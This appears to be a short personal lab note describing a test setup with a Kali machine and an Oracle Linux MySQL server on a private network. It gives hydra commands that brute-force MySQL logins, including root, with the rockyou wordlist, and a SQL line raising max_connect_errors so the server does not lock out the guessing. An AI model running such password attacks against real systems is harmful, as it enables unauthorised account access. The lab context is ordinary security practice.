# Web Application - Test Django

[Back](../../index.md)

- [Web Application - Test Django](#web-application---test-django)
  - [Architecture](#architecture)

---

## Architecture

- Target server:
  - ol8
  - mysql
  - ip: 192.168.1.11
- Tester Machine
  - kali
  - ip: 192.168.1.0/24

```sh
hydra -L /usr/share/wordlists/nmap.lst -P /usr/share/wordlists/rockyou.txt 192.168.1.11 mysql

hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.11 mysql
```


```sql
SET GLOBAL max_connect_errors = 100000000;
```
